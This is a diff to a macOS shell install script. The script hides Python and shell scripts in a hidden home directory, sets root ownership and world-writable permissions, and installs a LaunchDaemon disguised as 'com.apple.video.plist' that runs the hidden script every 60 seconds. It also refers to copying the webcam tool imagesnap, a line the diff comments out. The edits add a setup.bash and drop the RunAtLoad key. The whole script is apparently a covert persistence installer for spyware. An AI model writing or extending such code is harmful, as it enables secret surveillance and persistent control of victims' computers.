@@ -7,6 +7,7 @@ mkdir $HOME/.hidden
 
 cp woffice.py $HOME/.hidden/woffice.py
 cp woffice.sh $HOME/.hidden/woffice.sh
+cp setup.bash $HOME/.hidden/setup.bash
 
 
 
@@ -15,6 +16,7 @@ cp woffice.sh $HOME/.hidden/woffice.sh
 chown root $HOME/.hidden/woffice.py
 chmod +x $HOME/.hidden/woffice.py
 chmod 777 $HOME/.hidden/woffice.sh
+chmod 777 $HOME/.hidden/setup.bash
 chown root $HOME/.hidden/woffice.sh
 #chmod u+s $HOME/.hidden/woffice.sh
 #sh $HOME/.hidden/woffice.sh
@@ -34,8 +36,7 @@ echo '
         <string>/usr/bin/python</string>
         <string>'$HOME'/.hidden/woffice.py</string>
     </array>
-    <key>RunAtLoad</key>
-        <true/>
+
     <key>StartInterval</key>
         <integer>60</integer>
     <key>AbandonProcessGroup</key>
@@ -50,4 +51,4 @@ chmod 0644 /Library/LaunchDaemons/com.apple.video.plist
 launchctl load -w /Library/LaunchDaemons/com.apple.video.plist
 
 #Copy imagesnap to the hidden directory
-cp imagesnap $HOME/.hidden
+#cp imagesnap $HOME/.hidden
